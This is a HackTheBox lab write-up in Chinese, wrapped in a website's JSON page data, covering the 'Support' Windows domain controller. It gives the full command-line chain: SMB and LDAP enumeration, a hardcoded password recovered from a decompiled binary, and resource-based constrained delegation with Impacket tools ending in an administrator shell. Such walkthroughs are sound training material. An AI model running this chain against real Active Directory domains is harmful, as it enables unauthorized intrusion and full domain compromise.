{"pageProps":{"postData":{"id":"HackTheBoxMachine -Support","contentHtml":"<h1>Machine -Support</h1>\n<blockquote>\n<p><a href=\"https://app.hackthebox.com/machines/Support\">https://app.hackthebox.com/machines/Support</a> | <code>Windows</code> | <code>~~Easy~~</code> <code>Medium</code></p>\n</blockquote>\n<p><img src=\"/post-images/HackTheBoxMachine%20-Support/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<h3>端口信息</h3>\n<p>使用 <code>nmap</code> 进行扫描</p>\n<pre><code class=\"hljs language-bash\">➜  Support nmap -sT -min-rate 5000 10.10.11.174\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-04 21:06 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> support.htb (10.10.11.174)\nHost is up (0.13s latency).\nNot shown: 988 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n53/tcp   open  domain\n88/tcp   open  kerberos-sec\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n389/tcp  open  ldap\n445/tcp  open  microsoft-ds\n464/tcp  open  kpasswd5\n593/tcp  open  http-rpc-epmap\n636/tcp  open  ldapssl\n3268/tcp open  globalcatLDAP\n3269/tcp open  globalcatLDAPssl\n5985/tcp open  wsman\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 1.00 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Support nmap -sT -A -p 53,88,135,138,389,445,636,593,3268,3269 10.10.11.174\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-04 21:07 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> support.htb (10.10.11.174)\nHost is up (0.20s latency).\n\nPORT    STATE    SERVICE       VERSION\n53/tcp  open     domain        Simple DNS Plus\n88/tcp  open     kerberos-sec  Microsoft Windows Kerberos (server <span class=\"hljs-keyword\">time</span>: 2025-06-04 12:45:55Z)\n135/tcp open     msrpc         Microsoft Windows RPC\n138/tcp filtered netbios-dgm\n389/tcp open     ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)\n445/tcp open     microsoft-ds?\n636/tcp open     tcpwrapped\n593/tcp  open  ncacn_http Microsoft Windows RPC over HTTP 1.0\n3268/tcp open  ldap       Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)\n3269/tcp open  tcpwrapped\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2022 (88%)\nOS CPE: cpe:/o:microsoft:windows_server_2022\nAggressive OS guesses: Microsoft Windows Server 2022 (88%)\nNo exact OS matches <span class=\"hljs-keyword\">for</span> host (<span class=\"hljs-built_in\">test</span> conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   <span class=\"hljs-built_in\">date</span>: 2025-06-04T12:46:16\n|_  start_date: N/A\n|_clock-skew: -21m30s\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   122.30 ms 10.10.16.1\n2   237.33 ms support.htb (10.10.11.174)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 68.41 seconds\n</code></pre>\n<h3>SMB 枚举</h3>\n<p>测试<code>SMB</code>是否允许匿名登录</p>\n<pre><code class=\"hljs language-bash\">➜  Support smbclient -L 10.10.11.174 -U anonymous                                      \nPassword <span class=\"hljs-keyword\">for</span> [WORKGROUP\\anonymous]:\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share \n        support-tools   Disk      support staff tools\n        SYSVOL          Disk      Logon server share \nReconnecting with SMB1 <span class=\"hljs-keyword\">for</span> workgroup listing.\ndo_connect: Connection to 10.10.11.174 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n</code></pre>\n<p>允许匿名登录，并且在<code>support-tools</code>中有一些工具，全部 <code>get</code> 下来</p>\n<pre><code class=\"hljs language-bash\">➜  Support smbclient //10.10.11.174/support-tools -U anonymous -N\nTry <span class=\"hljs-string\">\"help\"</span> to get a list of possible commands.\nsmb: \\> <span class=\"hljs-built_in\">dir</span>\n  .                                   D        0  Thu Jul 21 01:01:06 2022\n  ..                                  D        0  Sat May 28 19:18:25 2022\n  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 19:19:19 2022\n  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 19:19:55 2022\n  putty.exe                           A  1273576  Sat May 28 19:20:06 2022\n  SysinternalsSuite.zip               A 48102161  Sat May 28 19:19:31 2022\n  UserInfo.exe.zip                    A   277499  Thu Jul 21 01:01:07 2022\n  windirstat1_1_2_setup.exe           A    79171  Sat May 28 19:20:17 2022\n  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 19:19:43 2022\n\n                4026367 blocks of size 4096. 955928 blocks available\nsmb: \\> \n</code></pre>\n<ol>\n<li><code>7-ZipPortable_21.07.paf.exe</code>:\n<ul>\n<li><strong>工具:</strong> 7-Zip Portable</li>\n<li><strong>用途:</strong> 这是一个便携版本的 7-Zip 文件归档器。7-Zip 是一款免费开源的压缩/解压缩软件，支持多种格式，如 7z, ZIP, GZIP, TAR, RAR 等。<code>.paf.exe</code> 通常是 PortableApps.com 格式的便携应用。</li>\n</ul>\n</li>\n<li><code>npp.8.4.1.portable.x64.zip</code>:\n<ul>\n<li><strong>工具:</strong> Notepad++ Portable (64位)</li>\n<li><strong>用途:</strong> 这是一个包含 Notepad++ 便携版的 ZIP 压缩文件。Notepad++ 是一款非常流行的免费源代码编辑器和 Windows 记事本替代品，支持多种编程语言，功能强大。</li>\n</ul>\n</li>\n<li><code>putty.exe</code>:\n<ul>\n<li><strong>工具:</strong> PuTTY</li>\n<li><strong>用途:</strong> 这是一个独立的 PuTTY 可执行文件。PuTTY 是一款广受欢迎的免费开源终端模拟器、串行控制台和网络文件传输应用程序。它最常用于通过 SSH、Telnet 或 rlogin 协议连接到远程服务器。</li>\n</ul>\n</li>\n<li><code>SysinternalsSuite.zip</code>:\n<ul>\n<li><strong>工具:</strong> Sysinternals Suite</li>\n<li><strong>用途:</strong> 这是一个包含微软 Sysinternals Suite 的 ZIP 压缩文件。Sysinternals Suite 是一套由 Mark Russinovich 开发的强大的 Windows 系统管理、故障排除和诊断工具集合（现在属于微软）。著名的工具包括 Process Explorer, Process Monitor, Autoruns, PsExec 等。</li>\n</ul>\n</li>\n<li><code>UserInfo.exe.zip</code>:\n<ul>\n<li><strong>工具:</strong> 未知 (可能为自定义或特定用途工具)</li>\n<li><strong>用途:</strong> 这是一个名为 <code>UserInfo.exe</code> 的可执行文件的 ZIP 压缩包。从名称上看，它可能是一个用于收集或显示用户信息的工具。这可能是系统管理员常用的自定义脚本或小程序，或者是特定场景下需要的工具。在渗透测试中，这类自定义工具往往值得进一步分析。</li>\n</ul>\n</li>\n<li><code>windirstat1_1_2_setup.exe</code>:\n<ul>\n<li><strong>工具:</strong> WinDirStat 安装程序</li>\n<li><strong>用途:</strong> 这是 WinDirStat 版本 1.1.2 的安装程序。WinDirStat 是一款磁盘使用情况统计查看器和清理工具，它可以图形化地显示磁盘空间占用情况，帮助用户找到占用空间大的文件和文件夹。</li>\n</ul>\n</li>\n<li><code>WiresharkPortable64_3.6.5.paf.exe</code>:\n<ul>\n<li><strong>工具:</strong> Wireshark Portable (64位)</li>\n<li><strong>用途:</strong> 这是一个便携版本的 Wireshark。Wireshark 是世界上应用最广泛的网络协议分析器，用于捕获和交互式浏览计算机网络上运行的流量。<code>.paf.exe</code> 格式表明它也是 PortableApps.com 的便携应用。</li>\n</ul>\n</li>\n</ol>\n<p>上面的所有应用中只有<code>UserInfo.exe</code> 不是公开的软件，我们可以着重对该软件进行分析</p>\n<h2>分析 UserInfo.exe</h2>\n<p>使用 <code>dnSpy</code> 来分析，该程序貌似是通过 <code>LDAP</code> 来检索用户信息，并且内置了用户（大致看懂）</p>\n<p>下面的类 <code>Protected</code> 是加密密码的（这里开始使用<code>AI</code>来分析）</p>\n<p>这一段代码其实是使用异或加密密码，并且秘钥是<code>armando</code> ，因此我们能够直接得到密码</p>\n<pre><code class=\"hljs language-bash\">using System;\nusing System.Text;\n\nnamespace UserInfo.Services\n{\n\t// Token: 0x02000006 RID: 6\n\tinternal class Protected\n\t{\n\t\t// Token: 0x0600000F RID: 15 RVA: 0x00002118 File Offset: 0x00000318\n\t\tpublic static string <span class=\"hljs-function\"><span class=\"hljs-title\">getPassword</span></span>()\n\t\t{\n\t\t\tbyte[] array = Convert.FromBase64String(Protected.enc_password);\n\t\t\tbyte[] array2 = array;\n\t\t\t<span class=\"hljs-keyword\">for</span> (int i = 0; i &#x3C; array.Length; i++)\n\t\t\t{\n\t\t\t\tarray2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);\n\t\t\t}\n\t\t\t<span class=\"hljs-built_in\">return</span> Encoding.Default.GetString(array2);\n\t\t}\n\n\t\t// Token: 0x04000005 RID: 5\n\t\tprivate static string enc_password = <span class=\"hljs-string\">\"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E\"</span>;\n\n\t\t// Token: 0x04000006 RID: 6\n\t\tprivate static byte[] key = Encoding.ASCII.GetBytes(<span class=\"hljs-string\">\"armando\"</span>);\n\t}\n}\n</code></pre>\n<p>通过 <code>AI</code> 生成解密脚本</p>\n<pre><code class=\"hljs language-bash\">import <span class=\"hljs-built_in\">base64</span>\n\n<span class=\"hljs-comment\"># 从 C# 代码中获取的值</span>\nenc_password_b64 = <span class=\"hljs-string\">\"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E\"</span>\nkey_string = <span class=\"hljs-string\">\"armando\"</span>\nxor_constant = 223\n\n<span class=\"hljs-comment\"># 1. Base64 解码</span>\ntry:\n    encrypted_bytes = base64.b64decode(enc_password_b64)\nexcept base64.binascii.Error as e:\n    <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"Base64 解码错误: {e}\"</span>)\n    <span class=\"hljs-built_in\">exit</span>()\n\n<span class=\"hljs-comment\"># 2. 获取密钥的字节形式 (ASCII)</span>\nkey_bytes = key_string.encode(<span class=\"hljs-string\">'ascii'</span>)\n\n<span class=\"hljs-comment\"># 准备一个可变的字节数组来存放解密后的字节</span>\ndecrypted_bytes = bytearray()\n\n<span class=\"hljs-comment\"># 3. 执行 XOR 解密</span>\n<span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> range(len(encrypted_bytes)):\n    <span class=\"hljs-comment\"># C# 中的逻辑是: (byte ^ key_byte ^ 223)</span>\n    dec_byte = encrypted_bytes[i] ^ key_bytes[i % len(key_bytes)] ^ xor_constant\n    decrypted_bytes.append(dec_byte)\n\n<span class=\"hljs-comment\"># 4. 将解密后的字节数组转换为字符串</span>\n<span class=\"hljs-comment\"># C# 中的 Encoding.Default 行为可能依赖于系统区域设置。</span>\n<span class=\"hljs-comment\"># 我们首先尝试 'utf-8'，如果密码包含非 ASCII 字符且编码不同，可能需要调整。</span>\n<span class=\"hljs-comment\"># 对于这个特定的密码 \"Cisco.12345\"，'utf-8' 或 'ascii' 都可以。</span>\ntry:\n    final_password = decrypted_bytes.decode(<span class=\"hljs-string\">'utf-8'</span>)\nexcept UnicodeDecodeError:\n    <span class=\"hljs-comment\"># 如果 utf-8 失败，可以尝试其他编码，如 latin-1 (常用于模拟某些 Windows 默认编码)</span>\n    try:\n        final_password = decrypted_bytes.decode(<span class=\"hljs-string\">'latin-1'</span>)\n    except UnicodeDecodeError as e:\n        <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"字符串解码错误: {e}\"</span>)\n        <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"解密后的字节（原始）: {decrypted_bytes}\"</span>)\n        final_password = <span class=\"hljs-string\">\"解码失败，请检查编码\"</span>\n\n<span class=\"hljs-comment\"># 打印结果</span>\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"Base64 编码的密文: {enc_password_b64}\"</span>)\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"密钥字符串: {key_string}\"</span>)\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"固定的 XOR 值: {xor_constant}\"</span>)\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"解密后的字节 (十六进制): {decrypted_bytes.hex()}\"</span>)\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"解密后的密码: {final_password}\"</span>)\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Support python getpass.py       \nBase64 编码的密文: 0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E\n密钥字符串: armando\n固定的 XOR 值: 223\n解密后的字节 (十六进制): 6e764566454b31365e31614d3424653741636c55663878247452577850574f31256c6d7a\n解密后的密码: nvEfEK16^1aM4$e7AclUf8x<span class=\"hljs-variable\">$tRWxPWO1</span>%lmz\n</code></pre>\n<p>而 <code>LdapQuery</code> 类的构造函数中能看到</p>\n<pre><code class=\"hljs language-bash\">public <span class=\"hljs-function\"><span class=\"hljs-title\">LdapQuery</span></span>()\n\t\t{\n\t\t\tstring password = Protected.getPassword();\n\t\t\tthis.entry = new DirectoryEntry(<span class=\"hljs-string\">\"LDAP://support.htb\"</span>, <span class=\"hljs-string\">\"support\\\\ldap\"</span>, password);\n\t\t\tthis.entry.AuthenticationType = AuthenticationTypes.Secure;\n\t\t\tthis.ds = new DirectorySearcher(this.entry);\n\t\t}\n</code></pre>\n<p>创建 <code>DirectoryEntry</code> 对象时，第二个参数通常用于指定用户名。因此，这里的用户名是：<code>support\\ldap</code></p>\n<p>这个格式 <code>DOMAIN\\username</code> 表明 <code>support</code> 可能是域名或者工作组名，而 <code>ldap</code> 是具体的用户名。</p>\n<p>我们直接测试凭据是否是正确的</p>\n<pre><code class=\"hljs language-bash\">➜  Support nxc ldap 10.10.11.174 -u ldap -p <span class=\"hljs-string\">'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'</span> -d support.htb\nLDAP        10.10.11.174    389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)\nLDAP        10.10.11.174    389    DC               [+] support.htb\\ldap:nvEfEK16^1aM4$e7AclUf8x<span class=\"hljs-variable\">$tRWxPWO1</span>%lmz \n</code></pre>\n<p>凭据是正确的</p>\n<h2>域分析</h2>\n<h3>域初次分析</h3>\n<p><code>BloodHound</code> 分析域</p>\n<pre><code class=\"hljs language-bash\">➜  Support bloodhound-python -u ldap -p <span class=\"hljs-string\">'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'</span> -d <span class=\"hljs-string\">'support.htb'</span> -ns 10.10.11.174 --zip -c All -dc <span class=\"hljs-string\">'support.htb'</span>\nINFO: BloodHound.py <span class=\"hljs-keyword\">for</span> BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: support.htb\nINFO: Getting TGT <span class=\"hljs-keyword\">for</span> user\nINFO: Connecting to LDAP server: support.htb\nWARNING: Kerberos auth to LDAP failed, trying NTLM\nINFO: Found 1 domains\nINFO: Found 1 domains <span class=\"hljs-keyword\">in</span> the forest\nINFO: Found 3 computers\nINFO: Connecting to LDAP server: support.htb\nWARNING: Kerberos auth to LDAP failed, trying NTLM\nINFO: Found 21 <span class=\"hljs-built_in\">users</span>\nINFO: Found 53 <span class=\"hljs-built_in\">groups</span>\nINFO: Found 2 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: SummerMachine.support.htb\nINFO: Querying computer: Management.support.htb\nINFO: Querying computer: dc.support.htb\nWARNING: Could not resolve: SummerMachine.support.htb: The resolution lifetime expired after 3.104 seconds: Server Do53:10.10.11.174@53 answered The DNS operation timed out.\nINFO: Done <span class=\"hljs-keyword\">in</span> 00M 23S\nINFO: Compressing output into 20250605003230_bloodhound.zip\n</code></pre>\n<p>我们当前获得的用户 <code>Ldap</code> 的信息，仅仅只是域成员</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-Support/image1.png\" alt=\"image.png\"></p>\n<p>所有的用户</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-Support/image2.png\" alt=\"image.png\"></p>\n<p>我们查看远程组有哪些成员</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-Support/image3.png\" alt=\"image.png\"></p>\n<p><code>SUPPORT</code>用户信息</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-Support/image4.png\" alt=\"image.png\"></p>\n<p>那我们大概是要先获取到<code>SUPPORT</code> 用户？但是现在没有别的信息了</p>\n<h3>LDAP 信息收集</h3>\n<p>所以我们先使用 <code>LADP</code> 用户进行信息收集，找一些有用的信息</p>\n<p>我们首先查询用户信息</p>\n<pre><code class=\"hljs language-bash\">➜  Support ldapsearch -x -H ldap://10.10.11.174:389 -w <span class=\"hljs-string\">'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'</span> -b <span class=\"hljs-string\">'CN=USERS,DC=SUPPORT,DC=HTB'</span> -D <span class=\"hljs-string\">'CN=LDAP,CN=USERS,DC=SUPPORT,DC=HTB'</span>\n</code></pre>\n<p>信息太多了…</p>\n<p>我们尝试查一下<code>SUPPORT</code> 用户的信息</p>\n<pre><code class=\"hljs language-bash\">➜  Support ldapsearch -x -H ldap://10.10.11.174:389 -w <span class=\"hljs-string\">'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'</span> -b <span class=\"hljs-string\">'CN=SUPPORT,CN=USERS,DC=SUPPORT,DC=HTB'</span> -D <span class=\"hljs-string\">'CN=LDAP,CN=USERS,DC=SUPPORT,DC=HTB'</span>\n<span class=\"hljs-comment\"># extended LDIF                                     </span>\n<span class=\"hljs-comment\">#                                  </span>\n<span class=\"hljs-comment\"># LDAPv3     </span>\n<span class=\"hljs-comment\"># base &#x3C;CN=SUPPORT,CN=USERS,DC=SUPPORT,DC=HTB> with scope subtree</span>\n<span class=\"hljs-comment\"># filter: (objectclass=*)</span>\n<span class=\"hljs-comment\"># requesting: ALL                                                                                                 </span>\n<span class=\"hljs-comment\">#                                       </span>\n                                                         \n<span class=\"hljs-comment\"># support, Users, support.htb</span>\ndn: CN=support,CN=Users,DC=support,DC=htb\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass: user\ncn: support    \nc: US      \nl: Chapel Hill\nst: NC\npostalCode: 27514\ndistinguishedName: CN=support,CN=Users,DC=support,DC=htb\ninstanceType: 4\nwhenCreated: 20220528111200.0Z\nwhenChanged: 20220528111201.0Z\nuSNCreated: 12617\n**info: Ironside47pleasure40Watchful**\nmemberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb\nmemberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb\nuSNChanged: 12630\ncompany: support\nstreetAddress: Skipper Bowles Dr\nname: support\nobjectGUID:: CqM5MfoxMEWepIBTs5an8Q==\n</code></pre>\n<p>其中的<code>info</code>字段很有趣，可能就是该用户的凭据</p>\n<pre><code class=\"hljs language-bash\">info: Ironside47pleasure40Watchful\n</code></pre>\n<p>测试凭据，假如该凭据有效，那么我们就可以对<code>DC</code>进行远程了</p>\n<pre><code class=\"hljs language-bash\">➜  Support nxc wmi 10.10.11.174 -u support -p <span class=\"hljs-string\">'Ironside47pleasure40Watchful'</span> -d support.htb\nRPC         10.10.11.174    135    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)\nRPC         10.10.11.174    135    DC               [+] support.htb\\support:Ironside47pleasure40Watchful\n</code></pre>\n<p>该凭据有效</p>\n<pre><code class=\"hljs language-bash\">➜  Support evil-winrm -i 10.10.11.174 -u <span class=\"hljs-string\">'support'</span> -p <span class=\"hljs-string\">'Ironside47pleasure40Watchful'</span>\n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc<span class=\"hljs-string\">' for module Reline\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\support\\Documents> \n</span></code></pre>\n<p><code>Support</code>用户<code>Desktop</code>文件夹可以得到 <code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\support\\Desktop> <span class=\"hljs-built_in\">type</span> user.txt\nd52f8d3f19ac0230628b1805483c760c\n</code></pre>\n<h2>权限提升</h2>\n<p>首先使用 <code>Winpeas</code> 走一波，没有很多的有用的信息</p>\n<p><code>BloodHound</code>再进行分析，发现<code>Support</code>用户对<code>DC</code>有<code>GenericAll</code>权限</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-Support/image5.png\" alt=\"image.png\"></p>\n<h3>RBCD 基于资源约束委派</h3>\n<p><code>Support</code>用户对<code>DC</code>有<code>GenericAll</code>权限，我们可以完全控制<code>DC</code></p>\n<p>这里可以打 <code>RBCD</code></p>\n<p>首先创建计算机账户</p>\n<pre><code class=\"hljs language-bash\">➜  Support addcomputer.py support.htb/support:<span class=\"hljs-string\">'Ironside47pleasure40Watchful'</span> -computer-name TEST\\$ -computer-pass 123456 -dc-host support.htb -dc-ip 10.10.11.174\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Successfully added machine account TEST$ with password 123456.\n</code></pre>\n<p><code>RBCD</code> 委派设置，以<code>support</code>的身份登录到<code>DC</code>，修改计算机账户<code>DC$</code>的一个属性<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code></p>\n<pre><code class=\"hljs language-bash\">➜  Support rbcd.py support.htb/support:<span class=\"hljs-string\">'Ironside47pleasure40Watchful'</span> -dc-ip 10.10.11.174 -action write -delegate-to DC\\$ -delegate-from TEST\\$ \nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty\n[*] Delegation rights modified successfully!\n[*] TEST$ can now impersonate <span class=\"hljs-built_in\">users</span> on DC$ via S4U2Proxy\n[*] Accounts allowed to act on behalf of other identity:\n[*]     TEST$        (S-1-5-21-1677581083-3380853377-188903654-5601)\n</code></pre>\n<p>最后利用 <code>S4U</code> 协议伪造 <code>Administrator</code> 用户申请 <code>ST</code></p>\n<pre><code class=\"hljs language-bash\">➜  Support getST.py -spn cifs/DC.support.htb -impersonate administrator support.htb/TEST\\$:<span class=\"hljs-string\">'123456'</span> -dc-ip 10.10.11.174\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Getting TGT <span class=\"hljs-keyword\">for</span> user\n[*] Impersonating administrator\n[*] Requesting S4U2self\n[*] Requesting S4U2Proxy\n[*] Saving ticket <span class=\"hljs-keyword\">in</span> administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Support <span class=\"hljs-built_in\">export</span> KRB5CCNAME=Administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache \n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Support psexec.py support.htb/administrator@dc.support.htb -k -no-pass\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Requesting shares on dc.support.htb.....\n[*] Found writable share ADMIN$\n[*] Uploading file niOpACUP.exe\n[*] Opening SVCManager on dc.support.htb.....\n[*] Creating service oDhJ on dc.support.htb.....\n[*] Starting service oDhJ.....\n[!] Press <span class=\"hljs-built_in\">help</span> <span class=\"hljs-keyword\">for</span> extra shell commands\nMicrosoft Windows [Version 10.0.20348.859]\n(c) Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32> \n</code></pre>\n<p>读取 <code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\">C:\\Users\\Administrator\\Desktop> <span class=\"hljs-built_in\">type</span> root.txt\n89306b6f9ce190f011354f60b3342424\n</code></pre>","title":"HackTheBox - Machine - Support","date":"2025-06-05","updated":"2025-06-05","tags":["HackTheBox","Windows","RBCD","Reverse"],"categories":"靶机","comments":true,"description":"Machine -Support\n\n https://app.hackthebox.com/machines/Support | `Windows` | `~~Easy~~` `Medium`\n \n\n\n\nRecon\n\n端口信息\n\n使用 `nmap` 进行扫描\n\n\n\n\n\nSMB 枚举\n\n测试`SMB`是否允许匿名登录\n\n\n\n允许匿名登录，并且在`support-tools`中有一些工具，全部 `ge..."},"recentPosts":[{"id":"TheHackersLabsDoraemon","title":"TheHackersLabs - Doraemon","date":"2025-08-03","isEncrypted":false,"year":"2025","month":"08","day":"03"},{"id":"HackTheBoxSeason8 - Editor","title":"HackTheBox - Season8 - Editor","date":"2025-08-03","isEncrypted":true,"year":"2025","month":"08","day":"03"},{"id":"TheHackersLabsHellRoot","title":"TheHackersLabs - HellRoot","date":"2025-08-02","isEncrypted":false,"year":"2025","month":"08","day":"02"},{"id":"群U靶机 - Cliv2","title":"群U靶机 - Cliv2","date":"2025-07-31","isEncrypted":false,"year":"2025","month":"07","day":"31"},{"id":"TheHackersLabsMerchan","title":"TheHackersLabs - Merchan","date":"2025-07-31","isEncrypted":false,"year":"2025","month":"07","day":"31"},{"id":"TheHackersLabsHEXTHINK SILENT SHADOW","title":"TheHackersLabs - HEXTHINK SILENT SHADOW","date":"2025-07-31","isEncrypted":false,"year":"2025","month":"07","day":"31"},{"id":"HackTheBoxSeason8 - Era","title":"HackTheBox - Season8 - Era","date":"2025-07-29","isEncrypted":true,"year":"2025","month":"07","day":"29"}]},"__N_SSG":true}